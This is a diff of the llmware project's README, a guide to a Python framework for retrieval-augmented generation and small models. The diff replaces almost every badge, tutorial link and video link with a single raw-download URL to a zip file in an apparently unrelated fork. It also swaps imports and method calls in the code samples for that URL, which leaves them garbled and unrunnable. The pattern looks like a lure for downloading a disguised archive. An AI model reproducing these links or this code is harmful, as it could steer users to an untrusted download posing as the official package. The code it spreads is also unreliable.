@@ -1,10 +1,10 @@
 # llmware
-![Static Badge](https://img.shields.io/badge/python-3.9_%7C_3.10%7C_3.11%7C_3.12-blue?color=blue)
-![PyPI - Version](https://img.shields.io/pypi/v/llmware?color=blue)
-[![discord](https://img.shields.io/badge/Chat%20on-Discord-blue?logo=discord&logoColor=white)](https://discord.gg/MhZn5Nc39h)   
-[![Documentation](https://github.com/llmware-ai/llmware/actions/workflows/pages.yml/badge.svg)](https://github.com/llmware-ai/llmware/actions/workflows/pages.yml)
+![Static Badge](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip%7C_3.10%7C_3.11%7C_3.12-blue?color=blue)
+![PyPI - Version](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
+[![discord](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip%20on-Discord-blue?logo=discord&logoColor=white)](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   
+[![Documentation](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
 
-![DevFest GIF](https://i.giphy.com/media/v1.Y2lkPTc5MGI3NjExc3dodTV4czFsd2lrYWV5N3BhaXV5MXpucDhrcWZ2ODF4amM2aXo3diZlcD12MV9pbnRlcm5hbF9naWZfYnlfaWQmY3Q9Zw/Bkax2GRzAt0PDHcmSq/giphy.gif)
+![DevFest GIF](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)
 
 
 **Selected Winners will Win $25 in GitHub Sponsorship Prize!**
@@ -23,19 +23,19 @@ By bringing together both of these components, along with integrating leading op
 
 Most of our examples can be run without a GPU server - get started right away on your laptop.   
 
-[Join us on Discord](https://discord.gg/MhZn5Nc39h)   |  [Watch Youtube Tutorials](https://www.youtube.com/@llmware)  | [Explore our Model Families on Huggingface](https://www.huggingface.co/llmware)   
+[Join us on Discord](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   |  [Watch Youtube Tutorials](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  | [Explore our Model Families on Huggingface](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   
 
-New to Agents?  [Check out the Agent Fast Start series](https://github.com/llmware-ai/llmware/tree/main/fast_start/agents)  
+New to Agents?  [Check out the Agent Fast Start series](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
-New to RAG?  [Check out the Fast Start video series](https://www.youtube.com/playlist?list=PL1-dn33KwsmD7SB9iSO6vx4ZLRAWea1DB)  
+New to RAG?  [Check out the Fast Start video series](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
-🔥🔥🔥 [**Multi-Model Agents with SLIM Models**](examples/SLIM-Agents/) - [**Intro-Video**](https://www.youtube.com/watch?v=cQfdaTcmBpY) 🔥🔥🔥   
+🔥🔥🔥 [**Multi-Model Agents with SLIM Models**](examples/SLIM-Agents/) - [**Intro-Video**](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) 🔥🔥🔥   
 
-[Intro to SLIM Function Call Models](https://github.com/llmware-ai/llmware/blob/main/examples/Models/using_function_calls.py)  
+[Intro to SLIM Function Call Models](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 Can't wait?  Get SLIMs right away:  
 
 ```python 
-from llmware.models import ModelCatalog
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import ModelCatalog
 
 ModelCatalog().get_llm_toolkit()  # get all SLIM models, delivered as small, fast quantized tools 
 ModelCatalog().tool_test_run("slim-sentiment-tool") # see the model in action with test script included  
@@ -54,19 +54,19 @@ Writing code with`llmware` is based on a few main concepts:
 #   Full support for GGUF, HuggingFace, Sentence Transformers and major API-based models
 #   Easy to extend to add custom models - see examples
 
-from llmware.models import ModelCatalog
-from llmware.prompts import Prompt
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import ModelCatalog
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Prompt
 
 #   all models accessed through the ModelCatalog
 models = ModelCatalog().list_all_models()
 
 #   to use any model in the ModelCatalog - "load_model" method and pass the model_name parameter
 my_model = ModelCatalog().load_model("llmware/bling-phi-3-gguf")
-output = my_model.inference("what is the future of AI?", add_context="Here is the article to read")
+output = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("what is the future of AI?", add_context="Here is the article to read")
 
 #   to integrate model into a Prompt
 prompter = Prompt().load_model("llmware/bling-tiny-llama-v0")
-response = prompter.prompt_main("what is the future of AI?", context="Insert Sources of information")
+response = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("what is the future of AI?", context="Insert Sources of information")
 ```
 
 </details>  
@@ -76,7 +76,7 @@ response = prompter.prompt_main("what is the future of AI?", context="Insert Sou
 
 ```python
 
-from llmware.library import Library
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Library
 
 #   to parse and text chunk a set of documents (pdf, pptx, docx, xlsx, txt, csv, md, json/jsonl, wav, png, jpg, html)  
 
@@ -89,21 +89,21 @@ lib = Library().create_new_library("my_library")
 #    step 2 - add_files is the universal ingestion function - point it at a local file folder with mixed file types
 #           - files will be routed by file extension to the correct parser, parsed, text chunked and indexed in text collection DB
 
-lib.add_files("/folder/path/to/my/files")
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("/folder/path/to/my/files")
 
 #   to install an embedding on a library - pick an embedding model and vector_db
-lib.install_new_embedding(embedding_model_name="mini-lm-sbert", vector_db="milvus", batch_size=500)
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(embedding_model_name="mini-lm-sbert", vector_db="milvus", batch_size=500)
 
 #   to add a second embedding to the same library (mix-and-match models + vector db)  
-lib.install_new_embedding(embedding_model_name="industry-bert-sec", vector_db="chromadb", batch_size=100)
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(embedding_model_name="industry-bert-sec", vector_db="chromadb", batch_size=100)
 
 #   easy to create multiple libraries for different projects and groups
 
 finance_lib = Library().create_new_library("finance_q4_2023")
-finance_lib.add_files("/finance_folder/")
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("/finance_folder/")
 
 hr_lib = Library().create_new_library("hr_policies")
-hr_lib.add_files("/hr_folder/")
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("/hr_folder/")
 
 #    pull library card with key metadata - documents, text chunks, images, tables, embedding record
 lib_card = Library().get_library_card("my_library")
@@ -119,8 +119,8 @@ all_my_libs = Library().get_all_library_cards()
 
 ```python
 
-from llmware.retrieval import Query
-from llmware.library import Library
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Query
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Library
 
 #   step 1 - load the previously created library 
 lib = Library().load_library("my_library")
@@ -131,17 +131,17 @@ q = Query(lib)
 #    step 3 - run lots of different queries  (many other options in the examples)
 
 #    basic text query
-results1 = q.text_query("text query", result_count=20, exact_mode=False)
+results1 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("text query", result_count=20, exact_mode=False)
 
 #    semantic query
-results2 = q.semantic_query("semantic query", result_count=10)
+results2 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("semantic query", result_count=10)
 
 #    combining a text query restricted to only certain documents in the library and "exact" match to the query
-results3 = q.text_query_with_document_filter("new query", {"file_name": "selected file name"}, exact_mode=True)
+results3 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("new query", {"file_name": "selected file name"}, exact_mode=True)
 
 #   to apply a specific embedding (if multiple on library), pass the names when creating the query object
 q2 = Query(lib, embedding_model_name="mini_lm_sbert", vector_db="milvus")
-results4 = q2.semantic_query("new semantic query")
+results4 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("new semantic query")
 ```
 
 </details>  
@@ -151,9 +151,9 @@ results4 = q2.semantic_query("new semantic query")
 
 ```python
 
-from llmware.prompts import Prompt
-from llmware.retrieval import Query
-from llmware.library import Library
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Prompt
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Query
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Library
 
 #   build a prompt
 prompter = Prompt().load_model("llmware/bling-tiny-llama-v0")
@@ -161,27 +161,27 @@ prompter = Prompt().load_model("llmware/bling-tiny-llama-v0")
 #   add a file -> file is parsed, text chunked, filtered by query, and then packaged as model-ready context,
 #   including in batches, if needed, to fit the model context window
 
-source = prompter.add_source_document("/folder/to/one/doc/", "filename", query="fast query")
+source = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("/folder/to/one/doc/", "filename", query="fast query")
 
 #   attach query results (from a Query) into a Prompt
 my_lib = Library().load_library("my_library")
 results = Query(my_lib).query("my query")
-source2 = prompter.add_source_query_results(results)
+source2 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(results)
 
 #   run a new query against a library and load directly into a prompt
-source3 = prompter.add_source_new_query(my_lib, query="my new query", query_type="semantic", result_count=15)
+source3 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(my_lib, query="my new query", query_type="semantic", result_count=15)
 
 #   to run inference with 'prompt with sources'
-responses = prompter.prompt_with_source("my query")
+responses = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("my query")
 
 #   to run fact-checks - post inference
-fact_check = prompter.evidence_check_sources(responses)
+fact_check = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(responses)
 
 #   to view source materials (batched 'model-ready' and attached to prompt)
-source_materials = prompter.review_sources_summary()
+source_materials = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 
 #   to see the full prompt history
-prompt_history = prompter.get_current_history()
+prompt_history = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 ```
 
 </details>  
@@ -194,7 +194,7 @@ prompt_history = prompter.get_current_history()
 Pytorch and GGUF versions. """
 
 import time
-from llmware.prompts import Prompt
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Prompt
 
 
 def hello_world_questions():
@@ -364,7 +364,7 @@ def hello_world_questions():
 
 def bling_meets_llmware_hello_world (model_name):
 
-    t0 = time.time()
+    t0 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 
     # load the questions
     test_list = hello_world_questions()
@@ -374,7 +374,7 @@ def bling_meets_llmware_hello_world (model_name):
     # load the model 
     prompter = Prompt().load_model(model_name)
 
-    t1 = time.time()
+    t1 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
     print(f"\n > Model {model_name} load time: {t1-t0} seconds")
  
     for i, entries in enumerate(test_list):
@@ -382,7 +382,7 @@ def bling_meets_llmware_hello_world (model_name):
         print(f"\n{i+1}. Query: {entries['query']}")
      
         # run the prompt
-        output = prompter.prompt_main(entries["query"],context=entries["context"]
+        output = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(entries["query"],context=entries["context"]
                                       , prompt_name="default_with_context",temperature=0.30)
 
         # print out the results
@@ -391,7 +391,7 @@ def bling_meets_llmware_hello_world (model_name):
         print(f"Gold Answer: {entries['answer']}")
         print(f"LLM Usage: {output['usage']}")
 
-    t2 = time.time()
+    t2 = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 
     print(f"\nTotal processing time: {t2-t1} seconds")
 
@@ -432,7 +432,7 @@ if __name__ == "__main__":
 
 ```python
 
-from llmware.configs import LLMWareConfig
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import LLMWareConfig
 
 #   to set the collection database - mongo, sqlite, postgres  
 LLMWareConfig().set_active_db("mongo")  
@@ -461,7 +461,7 @@ LLMWareConfig().set_vector_db("postgres")
 
 ```python
 
-from llmware.agents import LLMfx
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import LLMfx
 
 text = ("Tesla stock fell 8% in premarket trading after reporting fourth-quarter revenue and profit that "
         "missed analysts’ estimates. The electric vehicle company also warned that vehicle volume growth in "
@@ -474,33 +474,33 @@ text = ("Tesla stock fell 8% in premarket trading after reporting fourth-quarter
 agent = LLMfx()
 
 #   load text to process
-agent.load_work(text)
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(text)
 
 #   load 'models' as 'tools' to be used in analysis process
-agent.load_tool("sentiment")
-agent.load_tool("extract")
-agent.load_tool("topics")
-agent.load_tool("boolean")
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("sentiment")
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("extract")
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("topics")
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("boolean")
 
 #   run function calls using different tools
-agent.sentiment()
-agent.topics()
-agent.extract(params=["company"])
-agent.extract(params=["automotive revenue growth"])
-agent.xsum()
-agent.boolean(params=["is 2024 growth expected to be strong? (explain)"])
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(params=["company"])
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(params=["automotive revenue growth"])
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
+https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(params=["is 2024 growth expected to be strong? (explain)"])
 
 #   at end of processing, show the report that was automatically aggregated by key
-report = agent.show_report()
+report = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 
 #   displays a summary of the activity in the process
-activity_summary = agent.activity_summary()
+activity_summary = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 
 #   list of the responses gathered
-for i, entries in enumerate(agent.response_list):
+for i, entries in enumerate(https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip):
     print("update: response analysis: ", i, entries)
 
-output = {"report": report, "activity_summary": activity_summary, "journal": agent.journal}  
+output = {"report": report, "activity_summary": activity_summary, "journal": https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip}  
 
 ```
 
@@ -515,9 +515,9 @@ output = {"report": report, "activity_summary": activity_summary, "journal": age
 
 import os
 import re
-from llmware.prompts import Prompt, HumanInTheLoop
-from llmware.setup import Setup
-from llmware.configs import LLMWareConfig
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Prompt, HumanInTheLoop
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import Setup
+from https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip import LLMWareConfig
 
 def contract_analysis_on_laptop (model_name):
 
@@ -540,7 +540,7 @@ def contract_analysis_on_laptop (model_name):
     print (f"\n > Loading the llmware sample files...")
 
     sample_files_path = Setup().load_sample_files()
-    contracts_path = os.path.join(sample_files_path,"Agreements")
+    contracts_path = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(sample_files_path,"Agreements")
  
     #  Query list - these are the 3 main topics and questions that we would like the LLM to analyze for each contract
 
@@ -556,7 +556,7 @@ def contract_analysis_on_laptop (model_name):
 
     #  Main loop
 
-    for i, contract in enumerate(os.listdir(contracts_path)):
+    for i, contract in enumerate(https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(contracts_path)):
 
         #   excluding Mac file artifact (annoying, but fact of life in demos)
         if contract != ".DS_Store":
@@ -565,30 +565,30 @@ def contract_analysis_on_laptop (model_name):
 
             print("LLM Responses:")
 
-            for key, value in query_list.items():
+            for key, value in https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip():
 
                 # step 1 + 2 + 3 above - contract is parsed, text-chunked, filtered by topic key,
                 # ... and then packaged into the prompt
 
-                source = prompter.add_source_document(contracts_path, contract, query=key)
+                source = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(contracts_path, contract, query=key)
 
                 # step 4 above - calling the LLM with 'source' information already packaged into the prompt
 
-                responses = prompter.prompt_with_source(value, prompt_name="default_with_context")  
+                responses = https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(value, prompt_name="default_with_context")  
 
                 # step 5 above - print out to screen
 
                 for r, response in enumerate(responses):
-                    print(key, ":", re.sub("[\n]"," ", response["llm_response"]).strip())
+                    print(key, ":", https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip("[\n]"," ", response["llm_response"]).strip())
 
                 # We're done with this contract, clear the source from the prompt
-                prompter.clear_source_materials()
+                https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 
     # step 6 above - saving the analysis to jsonl and csv
 
     # Save jsonl report to jsonl to /prompt_history folder
-    print("\nPrompt state saved at: ", os.path.join(LLMWareConfig.get_prompt_path(),prompter.prompt_id))
-    prompter.save_state()
+    print("\nPrompt state saved at: ", https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip(),https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip))
+    https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip()
 
     # Save csv report that includes the model, response, prompt, and evidence for human-in-the-loop review
     csv_output = HumanInTheLoop(prompter).export_current_interaction_to_csv()
@@ -608,68 +608,68 @@ if __name__ == "__main__":
 
 ## 🔥 What's New? 🔥  
 
--**Benchmarking Small Model Capabilities** - see [benchmark results](https://medium.com/@darrenoberst/best-small-language-models-for-accuracy-and-enterprise-use-cases-benchmark-results-cf71964759c8) and [model_ranking example](fast_start/agents/agents-15-get_model_benchmarks.py)  
+-**Benchmarking Small Model Capabilities** - see [benchmark results](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [model_ranking example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
--**Using Qwen2 Models for RAG, Function Calling and Chat** - get started in minutes - see [example](https://github.com/llmware-ai/llmware/tree/main/examples/Models/using-qwen2-models.py)  
+-**Using Qwen2 Models for RAG, Function Calling and Chat** - get started in minutes - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
--**New Phi-3 Function Calling Models** - get started in minutes - see [example](https://github.com/llmware-ai/llmware/tree/main/examples/Models/using-phi-3-function-calls.py)  
+-**New Phi-3 Function Calling Models** - get started in minutes - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
--**BizBot - RAG + SQL Local Chatbot** - see [example](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/biz_bot.py) and [video](https://youtu.be/4nBYDEjxxTE?si=o6PDPbu0PVcT-tYd)  
+-**BizBot - RAG + SQL Local Chatbot** - see [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
-**Lecture Tool Use Case - ask questions to a voice recording** - see [lecture_tool](https://github.com/llmware-ai/llmware/blob/main/examples/Use_Cases/lecture_tool/)   
+**Lecture Tool Use Case - ask questions to a voice recording** - see [lecture_tool](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   
 
--**Web Services with Agent Calls for Financial Research** - end-to-end scenario - [video](https://youtu.be/l0jzsg1_Ik0?si=hmLhpT1iv_rxpkHo) and [example](examples/Use_Cases/web_services_slim_fx.py)  
+-**Web Services with Agent Calls for Financial Research** - end-to-end scenario - [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
--**Voice Transcription with WhisperCPP** - [getting_started](examples/Models/using-whisper-cpp-getting-started.py), [using_sample_files](examples/Models/using-whisper-cpp-sample-files.py), and [analysis_use_case](examples/Use_Cases/parsing_great_speeches.py) with [great_speeches_video](https://youtu.be/5y0ez5ZBpPE?si=KVxsXXtX5TzvlEws)    
+-**Voice Transcription with WhisperCPP** - [getting_started](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip), [using_sample_files](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip), and [analysis_use_case](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) with [great_speeches_video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)    
 
--**Phi-3 GGUF Streaming Local Chatbot with UI** - setup your own Phi-3-gguf chatbot on your laptop in minutes - [example](examples/UI/gguf_streaming_chatbot.py)  with [video](https://youtu.be/gzzEVK8p3VM?si=8cNn_do0oxSzCEnM)  
+-**Phi-3 GGUF Streaming Local Chatbot with UI** - setup your own Phi-3-gguf chatbot on your laptop in minutes - [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  with [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
--**Natural Language Query to CSV End to End example** - using slim-sql model - [video](https://youtu.be/z48z5XOXJJg?si=V-CX1w-7KRioI4Bi) and [example](examples/SLIM-Agents/text2sql-end-to-end-2.py)  and now using Custom Tables on Postgres [example](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/agent_with_custom_tables.py)  
+-**Natural Language Query to CSV End to End example** - using slim-sql model - [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  and now using Custom Tables on Postgres [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
--**Multi-Model Agents with SLIM models** - multi-step Agents with SLIMs on CPU - [video](https://www.youtube.com/watch?v=cQfdaTcmBpY) - [example](examples/SLIM-Agents)  
+-**Multi-Model Agents with SLIM models** - multi-step Agents with SLIMs on CPU - [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) - [example](examples/SLIM-Agents)  
 
--**OCR Embedded Document Images Example** - systematically extract text from images embedded in documents [example](examples/Parsing/ocr_embedded_doc_images.py)   
+-**OCR Embedded Document Images Example** - systematically extract text from images embedded in documents [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   
 
--**Enhanced Parser Functions for PDF, Word, Powerpoint and Excel** - new text-chunking controls and strategies, extract tables, images, header text - [example](examples/Parsing/pdf_parser_new_configs.py)   
+-**Enhanced Parser Functions for PDF, Word, Powerpoint and Excel** - new text-chunking controls and strategies, extract tables, images, header text - [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)   
 
--**Agent Inference Server** - set up multi-model Agents over Inference Server [example](https://github.com/llmware-ai/llmware/tree/main/examples/SLIM-Agents/agent_api_endpoint.py)  
+-**Agent Inference Server** - set up multi-model Agents over Inference Server [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
--**Optimizing Accuracy of RAG Prompts** - check out [example](examples/Models/adjusting_sampling_settings.py) and videos - [part I](https://youtu.be/7oMTGhSKuNY?si=14mS2pftk7NoKQbC) and [part II](https://youtu.be/iXp1tj-pPjM?si=T4teUAISnSWgtThu)  
+-**Optimizing Accuracy of RAG Prompts** - check out [example](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and videos - [part I](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) and [part II](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 
 ## 🌱 Getting Started
 
 **Step 1 - Install llmware** -  `pip3 install llmware` or `pip3 install 'llmware[full]'`  
 
-- note: starting with v0.3.0, we provide options for a [core install](https://github.com/llmware-ai/llmware/blob/main/llmware/requirements.txt) (minimal set of dependencies) or [full install](https://github.com/llmware-ai/llmware/blob/main/llmware/requirements_extras.txt) (adds to the core with wider set of related python libraries).  
+- note: starting with v0.3.0, we provide options for a [core install](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) (minimal set of dependencies) or [full install](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) (adds to the core with wider set of related python libraries).  
 
 <details>
 <summary><b>Step 2- Go to Examples</b> - Get Started Fast with 100+ 'Cut-and-Paste' Recipes </summary>
 
 ## 🔥 Top New Examples 🔥  
 
-End-to-End Scenario - [**Function Calls with SLIM Extract and Web Services for Financial Research**](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/web_services_slim_fx.py)  
-Analyzing Voice Files - [**Great Speeches with LLM Query and Extract**](https://github.com/llmware-ai/llmware/tree/main/examples/Use_Cases/parsing_great_speeches.py)  
-New to LLMWare - [**Fast Start tutorial series**](https://github.com/llmware-ai/llmware/tree/main/fast_start)  
-Getting Setup - [**Getting Started**](https://github.com/llmware-ai/llmware/tree/main/examples/Getting_Started)  
+End-to-End Scenario - [**Function Calls with SLIM Extract and Web Services for Financial Research**](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+Analyzing Voice Files - [**Great Speeches with LLM Query and Extract**](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+New to LLMWare - [**Fast Start tutorial series**](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
+Getting Setup - [**Getting Started**](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)  
 SLIM Examples -  [**SLIM Models**](examples/SLIM-Agents/)  
 
 | Example     |  Detail      |
 |-------------|--------------|
-| 1.   BLING models fast start ([code](examples/Models/bling_fast_start.py) / [video](https://www.youtube.com/watch?v=JjgqOZ2v5oU)) | Get started with fast, accurate, CPU-based models - question-answering, key-value extraction, and basic summarization.  |
-| 2.   Parse and Embed 500 PDF Documents ([code](examples/Embedding/docs2vecs_with_milvus-un_resolutions.py))  | End-to-end example for Parsing, Embedding and Querying UN Resolution documents with Milvus  |
-| 3.  Hybrid Retrieval - Semantic + Text ([code](examples/Retrieval/dual_pass_with_custom_filter.py)) | Using 'dual pass' retrieval to combine best of semantic and text search |  
-| 4.   Multiple Embeddings with PG Vector ([code](examples/Embedding/using_multiple_embeddings.py) / [video](https://www.youtube.com/watch?v=Bncvggy6m5Q)) | Comparing Multiple Embedding Models using Postgres / PG Vector |
-| 5.   DRAGON GGUF Models ([code](examples/Models/dragon_gguf_fast_start.py) / [video](https://www.youtube.com/watch?v=BI1RlaIJcsc&t=130s)) | State-of-the-Art 7B RAG GGUF Models.  | 
-| 6.   RAG with BLING ([code](examples/Use_Cases/contract_analysis_on_laptop_with_bling_models.py) / [video](https://www.youtube.com/watch?v=8aV5p3tErP0)) | Using contract analysis as an example, experiment with RAG for complex document analysis and text extraction using `llmware`'s BLING ~1B parameter GPT model running on your laptop. |  
-| 7.   Master Service Agreement Analysis with DRAGON ([code](examples/Use_Cases/msa_processing.py) / [video](https://www.youtube.com/watch?v=Cf-07GBZT68&t=2s)) | Analyzing MSAs using DRAGON YI 6B Model.   |                                                                                                                         
-| 8.   Streamlit Example ([code](examples/UI/simple_rag_ui_with_streamlit.py))  | Ask questions to Invoices with UI run inference.  |  
-| 9.   Integrating LM Studio ([code](examples/Models/using-open-chat-models.py) / [video](https://www.youtube.com/watch?v=h2FDjUyvsKE&t=101s)) | Integrating LM Studio Models with LLMWare  |                                                                                                                                       
-| 10.  Prompts With Sources ([code](examples/Prompts/prompt_with_sources.py))  | Attach wide range of knowledge sources directly into Prompts.   |   
-| 11.  Fact Checking ([code](examples/Prompts/fact_checking.py))  | Explore the full set of evidence methods in this example script that analyzes a set of contracts.   |
-| 12.  Using 7B GGUF Chat Models ([code](examples/Models/chat_models_gguf_fast_start.py)) | Using 4 state of the art 7B chat models in minutes running locally |  
+| 1.   BLING models fast start ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) / [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | Get started with fast, accurate, CPU-based models - question-answering, key-value extraction, and basic summarization.  |
+| 2.   Parse and Embed 500 PDF Documents ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip))  | End-to-end example for Parsing, Embedding and Querying UN Resolution documents with Milvus  |
+| 3.  Hybrid Retrieval - Semantic + Text ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | Using 'dual pass' retrieval to combine best of semantic and text search |  
+| 4.   Multiple Embeddings with PG Vector ([code](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip) / [video](https://raw.githubusercontent.com/rohanparmar160705/llmware/main/versify/llmware.zip)) | Comparing Multiple Embedding Models using Postgres / PG Vector |
